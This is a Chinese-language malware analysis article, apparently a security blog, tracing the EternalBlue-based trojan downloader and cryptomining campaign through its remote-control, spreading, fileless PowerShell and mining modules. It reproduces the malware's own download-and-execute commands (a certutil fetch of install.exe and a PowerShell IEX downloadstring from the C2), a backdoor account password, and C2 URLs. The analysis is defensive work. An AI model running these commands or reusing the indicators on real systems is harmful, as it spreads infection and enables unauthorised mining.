<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029154515.png"></p>
<p>​    其保存位置为C:\Windows\temp\svvhost.exe：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029154857.png"></p>
</li>
</ol>
<h2 id="01-远控模块分析"><a href="#01-远控模块分析" class="headerlink" title="01 远控模块分析"></a>01 远控模块分析</h2><p>​    样本信息如下：</p>
<table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">MD5</th>
</tr>
</thead>
<tbody><tr>
<td align="center">svhhost.exe</td>
<td align="center">74e2a43b2b7c6e258b3a3fc2516c1235</td>
</tr>
</tbody></table>
<p>​    远控模块木马svhhost.exe主要作用是：每隔2秒从主体样本svhost.exe共享的内存 “HSKALWOEDJSLALQEOD”中读取shellcode，然后进行解压(解密)并执行。整体流程主要包括了持久化操作、获取共享内存执行shellcode:</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029164704.png"></p>
<p>​    遗憾的是由于时间太久，分析时不能获取到通过内存加载执行shellcode的功能链接，通过对我们在2019年1月9号检测到的名为xmrig-64_1.mlz的文件，也就是上文中提到的通过共享内存传递的Shellcode进行分析，可以确认该文件为门罗币的矿机，文件下载地址为：</p>
<p><code>hxxp://dl[.]haqo.net/xmrig-64_1.mlz</code>，链接矿池172.105.204.237 进行挖矿。</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>MD5</th>
</tr>
</thead>
<tbody><tr>
<td>xmrig-64_1.mlz</td>
<td>24c4149468926bedcb41f50ac88b40f3</td>
</tr>
</tbody></table>
<h2 id="02-永恒之蓝传播模块分析"><a href="#02-永恒之蓝传播模块分析" class="headerlink" title="02 永恒之蓝传播模块分析"></a>02 永恒之蓝传播模块分析</h2><p>​    样本信息如下：</p>
<table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">MD5</th>
</tr>
</thead>
<tbody><tr>
<td align="center">svvhost.exe</td>
<td align="center">2e9710a4b9cba3cd11e977af87570e3b</td>
</tr>
</tbody></table>
<p>​    svvhost.exe是利用py2exe对python代码进行打包实现的“永恒之蓝”传播模块，将其解压后可以看到如下一系列pyo文件：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029155247.png"></p>
<p>​    传播模块每隔20min进行一次攻击，包括内网漏洞机器及部分外网IP，对于中招的机器，会运行bat命令进行扩散：</p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cmd</span>.exe /c certutil -urlcache -split -fhttp://dl.haqo.<span class="built_in">net</span>/ dl.exe c:/install.exe&amp;c:/install.exe&amp;netshfirewall add portopening tcp <span class="number">65531</span> DNS&amp;netsh interface portproxy    add v4tov4listenport=<span class="number">65531</span> connectaddress=<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span> connectport=<span class="number">53</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029155312.png"></p>
<h1 id="3-向无文件攻击方式转变"><a href="#3-向无文件攻击方式转变" class="headerlink" title="3. 向无文件攻击方式转变"></a>3. 向无文件攻击方式转变</h1><p>​    通过上文的分析得知，最初“永恒之蓝木马下载器”系列木马的远控模块和传播模块文件需要落地，较为容易查杀，随着时间的推进，攻击者对木马进行了改进，最终完全脱离了原有流程，做到了无文件落地的”计划任务+PowerShell”的攻击模式，这使得攻击更加隐蔽，查杀难度增大。</p>
<p>​    从2018年12月19号开始，攻击者开始逐步进行更新，首先更新的是传播模块。</p>
<p>​    木马攻击成功后会在失陷主机上创建一个名为Bluetooths的计划任务，该计划任务会利用PowerShell从v.beahh.com处获取新的payload进行执行，该系列payload会为下载模块功能做前期准备，准备完成后下载攻击传播模块及挖矿模块到内存，然后直接利用IEX命令进行执行。 </p>
<p>​    由此开始，“永恒之蓝木马下载器”系列木马实现了新的攻击方式，脱离了最初版本需要文件落地的攻击模式，做到了无文件落地攻击。</p>
<p>​    整个攻击流程的变迁效果如下图所示：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029155422.png"></p>
<h2 id="00-新传播模块分析"><a href="#00-新传播模块分析" class="headerlink" title="00 新传播模块分析"></a>00 新传播模块分析</h2><p>​    与上述最初的传播模块还只是利用单一的永恒之蓝漏洞攻击不同，新的攻击组件集成了永恒之蓝漏洞、SMB爆破、MsSQL爆破等攻击方式，同时利用到了黑客工具mimiktaz、psexec等进行辅助破解攻击，在攻击成功后也采用添加用户、创建服务、创建计划任务的方式对被攻破的机器进行感染和控制。</p>
<p>​    这里我们从最新的传播模块进行整体手法的剖析，其中捕获到的一份利用url：</p>
<p><code>hxxp://27.102.107[.]137/ii.exe</code></p>
<p>​    下载的传播模块文件ii.exe(md5:def0e980d7c2a59b52d0c644a6e40763 )，该文件由pyinstaller打包而来，其和最初传播模块具体不同如下：</p>
<ol>
<li>使用窃取的数字签名（当前已过期），并将py模块编译为库（pyd）从而达到隐藏自己与增加分析难度的目的：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029155536.png"></p>
<p>​    去除签名，然后反编译，解包后的内容如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029155600.png"></p>
<p>​    继续反编译ii.pyc，得到脚本，脚本使用了base64和bz2加密：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029155819.png"></p>
<p>​    对加密脚本进行解密，其中依旧使用名称替换的方式进行了混淆，结果如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029155842.png"></p>
<ol start="2">
<li>首先会检测更新当前机器传播模块的版本是否为最新版。具体是通过内存映射检测当前版本，版本存储于内存映射中的格式为“自身路径+’**’+当前版本号+’$$’”，判断版本号是否相同，如果当前版本大于内存映射中的版本，则将程序复制过去：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029155918.png"></p>
<ol start="3">
<li> 加入了SMB、MSSQL弱口令爆破攻击，用于SMB、MsSql爆破的弱口令如下图所示。</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029155946.png"></p>
<p>​    其中，部分SMB弱口令攻击代码如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160019.png"></p>
<p>​    部分MsSQL数据库弱口令攻击代码如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160151.png"></p>
<ol start="4">
<li>之后会将多层混淆的mimikatz工具的powershell代码写入当前目录下的m2.ps1文件中，并将其在内存中直接执行：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160212.png"></p>
<p>​    部分m2.ps1内代码如下图所示:</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160259.png"></p>
<p>​    将抓取到的用户机器的域名、用户名、密码等信息保存到同目录下mkatz.ini文件中，格式如下图所示，所以若局域网中存在使用相同密码的机器，很容易被一网打尽，修改默认密码的重要性不言而喻。</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160330.png"></p>
<ol start="5">
<li>利用PsExec工具完成对被攻陷机器的远程控制，远程控制会去验证账户k8h3d并进行判断，如果已经感染成功，就会进行远程cmd执行，包括但不限于创建计划任务下载Payload、检测恶意组件、运行恶意组件等行为。</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160355.png"></p>
<ol start="6">
<li>扫描网络中开放有1433端口(SQL Server)的主机，尝试用弱密码进行登录，若成功则利用SQLServer服务在目标主机中添加一个标志性的账户k8h3d，此账户密码为k8d3j9SjfS7</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160405.png"></p>
<p>​    另外还会创建名为Bluetooths的计划任务，该计划任务通过bypass的方式绕过本地权限利用cmd执行base64加密的powershell来执行下一阶段任务：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160447.png"></p>
<p>​    该计划任务就是在被攻陷机器中开始新攻击的重要入口，计划任务每隔50分钟执行一次powershell脚本，该脚本作用为下载并执行下一阶段攻击程序， 上图中加密powershell解密后，内容如下，：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell  <span class="literal">-ep</span> bypass –e <span class="built_in">IEX</span>(<span class="built_in">New-Objects</span> Net.WebClinet).downloadstring(<span class="string">&quot;http://v.beahh.com/v&quot;</span>+<span class="variable">$env:USERDOMAIN</span>)</span><br></pre></td></tr></table></figure>

<ol start="7">
<li><p>新传播模块也会进行一些信息收集操作，统计的信息包括本地网卡mac地址、杀软信息、系统版本、感染标志、当前用户组、当前用户名等，其用于对感染信息的统计和后续的控制下发，上传信息的地址列表如下：</p>
<p><code>hxxp://info[.]haqo.net/e.png</code></p>
<p><code>hxxp://info[.]beahh.com/e.png</code></p>
<p><code>hxxp://info[.]abbny.com/e.png</code></p>
</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160609.png"></p>
<h2 id="01-入侵之后的后续攻击-前置准备"><a href="#01-入侵之后的后续攻击-前置准备" class="headerlink" title="01 入侵之后的后续攻击-前置准备"></a>01 入侵之后的后续攻击-前置准备</h2><p>​    入侵新机器成功后，会通过上述计划任务Bluetooths下载powershell脚本并加载到内存中执行，这里将其命名为v.ps1,捕获到多份经过多次混淆(至少4次)的powersehll脚本：</p>
<table>
<thead>
<tr>
<th>名称</th>
<th align="center">MD5</th>
</tr>
</thead>
<tbody><tr>
<td>v.ps1</td>
<td align="center">95adf923ba32cc5004277867181680c8</td>
</tr>
<tr>
<td>v.ps1</td>
<td align="center">55f0dd8c306db9fc8b9e45705cd66598</td>
</tr>
<tr>
<td>v.ps1</td>
<td align="center">c17cdee1afdc272a46b1cf25c1f44dcc</td>
</tr>
</tbody></table>
<p>​    从时间线来看，最初版本的脚本是在19年2月22被发现的v(95adf923ba32cc5004277867181680c8)</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160737.png"></p>
<p>​    该脚本是一个最初的测试版本，有如下一系列功能，其暂时未配置无文件挖矿功能：</p>
<ol>
<li> 通过WMI查询当前计算机信息，包括MAC地址、所有杀软信息，另外会检测是否存在杀软主动防御服务，完成后睡眠一段时间：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160818.png"></p>
<ol start="2">
<li>通过WMI检测列表中所有的系统进程是否运行，运行则关闭对应进程，并在之后清除对应进程文件，用于之后恶意样本对进程替换达到隐藏恶意攻击的目的：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160842.png"></p>
<p>检查的系统进程如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160854.png"></p>
<ol start="3">
<li><p>将收集到信息进行拼接，并判断如下三个标志文件的存在状态，来更新对应的exe传播模块，该版本攻击手法中，依旧存在用于传播的exe组件：<code>C:\Users\ADMINI~1\AppData\Local\Temp\tmplog.tmp</code></p>
<p><code>C:\Users\ADMINI~1\AppData\Local\Temp\tmplog2.tmp</code></p>
<p><code>C:\Windows\随机八位数字名称.exe</code></p>
<p>若检测到不存在tmplog2.tmp，则循环查询C:\Windows\下的所有命名格式随机八位数字名称.exe的文件，创建以其文件名命名的计划任务来持久化运行。</p>
<p>若检测到不存在tmplog.tmp，则会去如下URL：<code>hxxp://d[.\]beahh.com/update.png?p=11](http://d.beahh.com/update.png?p=11)</code> 处对传播模块exe进行更新，获取新的样本到C:\Windows\随机八位数字名称.exe，并创建对应的计划任务进行持久化执行：</p>
</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160941.png"></p>
<ol start="4">
<li><p>继续执行，稍后从URL：</p>
<p><code>hxxp://172[.]104.177.202/new.dat?11+信息+状态 </code></p>
<p>处获取powershell脚本到C:\ProgramData\Microsoft\cred.ps1，然后加载到内存中执行，同时创建名为Credentials的计划任务，定时启动该文件cred.ps1：</p>
</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161114.png"></p>
<p>​    创建的计划任务Credentials如下图所示：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161129.png"></p>
<p>​    而从2019年2日开始，最新版本的v.ps1进行下发，新版包括了无文件挖矿的powershell脚本：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161244.png"></p>
<p>​    样本中执行流程会依据C:\Users\ADMINI~1\AppData\Local\Temp下的几个不同日志文件存在状态来控制后续PayLoad的下发，具体文件和行为如下：</p>
<p><strong>kkk1.log：</strong></p>
<p>​    不存在创建以mac地址命名的计划任务，操作为从url：hxxp://v[.]y6h.net/g?h+当前时间 请求下载后续PayLoad加载到内存中直接执行：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161326.png"></p>
<p>​    计划任务如下图所示：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161342.png"></p>
<p>​    下载到的Payload为g(4ec29049ac81521c37dad2da6754d6a3)，解混淆后，主要完成了收集mac地址、杀软信息、感染版本、系统版本、用户名等信息并上传到服务器，用于获取到后续脚本：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161357.png"></p>
<p><strong>pp2.log：</strong></p>
<p>​    不存在行为和上述测试版设置计划任务，运行下载的cred.ps1相同，不同之处在于domain进行了改变，新domain为down[.]beahh.com：：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161420.png"></p>
<p><strong>333.log：</strong></p>
<p>​    不存在则从<code>hxxp://down[.]beahh.com/mn.dat?allv5</code>处下载mn.dat存储为mn.exe，然后加载运行，该模块就是最初的挖矿模块<strong>。</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161440.png"></p>
<p><strong>kk4.log：</strong></p>
<p>​    不存在则从<code>hxxp://down[.]beahh.com/ii.dat?p=allv5</code>处下载ii.dat，命名为4~8个随机字母.exe，该模块就是上述的ii.exe传播模块：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161501.png"></p>
<p><strong>ps5.log：</strong></p>
<p>​    在这里不同版本的脚本开始出现区别，在4月2号的样本中，该文件不存在则从hxxp://down[.]beahh.com/ddd.dat?allv5处下载ddd.dat，存储为ddd.exe，该模块为新版的利用了显卡驱动相关的挖矿模块：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161526.png"></p>
<p>​    而在4月3号的样本中，该步骤被去掉，新增了依据当前系统版本下载对应的d64.dat或d32.dat脚本并直接在内存中执行的流程，下载的脚本为powershell无文件挖矿脚本：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161541.png"></p>
<h2 id="02-入侵之后的后续攻击-无文件挖矿"><a href="#02-入侵之后的后续攻击-无文件挖矿" class="headerlink" title="02 入侵之后的后续攻击-无文件挖矿"></a>02 入侵之后的后续攻击-无文件挖矿</h2><p>​    这里以捕获到的d64.ps1样本进行分析说明，信息如下：</p>
<table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">MD5</th>
</tr>
</thead>
<tbody><tr>
<td align="center">d64.dat</td>
<td align="center">c90ecc4e12e085c7fbc571d9ba6d00d4</td>
</tr>
</tbody></table>
<p>​    解混淆后，脚本具体功能分析如下，该类型无文件挖矿脚本都是如下所示的流程：</p>
<ol>
<li>XMRig挖矿木马脚本被使用Base64编码保存：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029164952.png"></p>
<ol start="2">
<li>初始化Invoke-ReflectivePEInjection(内存中执行PE)</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161630.png"></p>
<ol start="3">
<li>经过一系列配置操作后，调用Invoke-ReflectivePEInjection将代码加载到内存中执行：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161640.png"></p>
<ol start="4">
<li>运行后，进行挖矿，矿池为52[.]139.168.125，运行状态如下图所示，此时版本为2.14.0，后续该挖矿脚本也会随时间的推移逐步更新：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161659.png"></p>
<h2 id="03-入侵之后的后续攻击-传播模块"><a href="#03-入侵之后的后续攻击-传播模块" class="headerlink" title="03 入侵之后的后续攻击-传播模块"></a>03 入侵之后的后续攻击-传播模块</h2><p>​    上述准备阶段下载到的所有powershell中，cred.ps1为后续攻击的开始powershell，这里捕获到两份相关的文件：</p>
<table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">MD5</th>
</tr>
</thead>
<tbody><tr>
<td align="center">cred.ps1(V1)</td>
<td align="center">31ce6662be59ca4c01c1730bc7150f19</td>
</tr>
<tr>
<td align="center">cred.ps1(V5)</td>
<td align="center">e05827e44d487d1782a32386123193ef</td>
</tr>
</tbody></table>
<p>​    两份powershell脚本都经过了4次加密混淆，主要区别在于版本不同，这里用最新到的v5版本的样本进行行为说明，cred.ps1(V5)脚本结构大致如下图所示：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161743.png"></p>
<p>​    该版本的传播模块与上文中分析的老版本相比最重要的区别是开始利用IEX直接加载到内存中执行的，从而完成了无文件攻击的方式。当然其在一些攻击细节方面也进行了调整优化，比如：</p>
<ol>
<li>调用永恒之蓝漏洞攻击：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161824.png"></p>
<p>​    对于不同的系统进行了不同的定制化操作，其中eb7函数主要针对Win 7、Windows2008、Windows vista、windows 2011，eb8函数主要针对win10、win 8、windows 2012。</p>
<p><strong>eb7函数：</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161900.png">****</p>
<p><strong>eb8函数：</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161908.png"></p>
<ol start="2">
<li>新SMB弱口令爆破密码：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161936.png"></p>
<p>​    攻击完成后，将FlashPlayer.lnk和flashplayer.tmp植入到目标机器并设置菜单启动目录进行新一轮的攻击：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161955.png"></p>
<ol start="5">
<li>循环进行版本更新，从hxxp://p[.]beahh.com/upgrade.php?ver=5&amp;mac=处获取更新信息：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162023.png"></p>
<p>​    通过对比发现，该脚本和Mykings僵尸网络变种木马使用到的攻击手法有很多类似，比如包括相同的攻击函数eb7()、eb8()，创建的计划任务都为%appdata%\Microsoft目录下，都会在攻击成功后对目标机器上传文件设置菜单启动项等。</p>
<h1 id="4-不断更新的攻击组件"><a href="#4-不断更新的攻击组件" class="headerlink" title="4. 不断更新的攻击组件"></a>4. 不断更新的攻击组件</h1><p>​    从19年4月开始，”永恒之蓝木马下载器”系列木马开始稳定的利用上述计划任务+powershell的无文件方式进行传播与攻击。之后对攻击组件和挖矿脚本依旧进行着频繁的更新，使其攻击能力和挖矿能力不断提升。其中对于域名和PoweShell脚本名称也进行了多次更改，其中使用到了DGA算法进行域名的生成，而windows下的攻击组件名称也变为了if.bin，近期攻击方式整理为下图所示：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162102.png"></p>
<p>​    其中在最新获取的if.bin传播模块中，攻击组件完成攻击后，远程在目标机上执行的命令部分如下，主要攻击方式为通过最新的Domain(如：t[.]zz3r0.com、t[.]zer9g.com、t[.]amynx.com、t[.]ackng.com)下载对应的PowerShell脚本并加载到内存执行攻击：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162117.png"></p>
<p>​    截至20年10月，该系列木马现有的攻击手段包括但不限于下图中的所有攻击方式：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162138.png"></p>
<h2 id="00-再次变化的传播方式分析"><a href="#00-再次变化的传播方式分析" class="headerlink" title="00 再次变化的传播方式分析"></a>00 再次变化的传播方式分析</h2><p>​    上图所述的所有攻击方式，只要有一种可以完成入侵任务，那么传播过程就会继续向下蔓延，通过在目标机上远程对诸如上述的ipc.jsp、ms.jsp、usb.jsp、mail.jsp、smgh.jsp(也叫做ipc.bin、ms.bin等)等等一系列以对应攻击方式来命名的脚本文件进行下载和执行，来完成新的传播。这里对该类脚本主要完成操作进行简要说明：</p>
<ol>
<li>会利用WMI命令检测常见杀软，并对其进行卸载：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162236.png"></p>
<ol start="2">
<li>创建计划任务blackball以及三个名称随机和路径随机的计划任务：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162251.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162302.png"></p>
<p>​    计划任务用于启动powershell执行如下图所示的脚本，用于下载新的前置准备模块a.jsp，我们留待稍后解释：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162319.png"></p>
<ol start="3">
<li>利用netsh.exe设置防火墙相关的规则：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162337.png"></p>
<h2 id="01-新的攻击前准备模块a-jsp"><a href="#01-新的攻击前准备模块a-jsp" class="headerlink" title="01 新的攻击前准备模块a.jsp"></a>01 新的攻击前准备模块a.jsp</h2><p>​    该模块近期下载C2为t[.]amynx.com，该文件也有多个版本的变迁，这里通过其中版本较新的一份样本对主要行为进行分析，样本信息如下：</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>MD5</th>
</tr>
</thead>
<tbody><tr>
<td>a.jsp</td>
<td>ff75c064248579f4bdabec6d6dba89d6</td>
</tr>
</tbody></table>
<p>​    该样本主要完成了对于如下介绍的一些传播模块和挖矿模块进行下载，是最新的攻击前置准备模块，具体行为如下，其中函数SIEX为封装的下载并执行脚本函数：</p>
<ol>
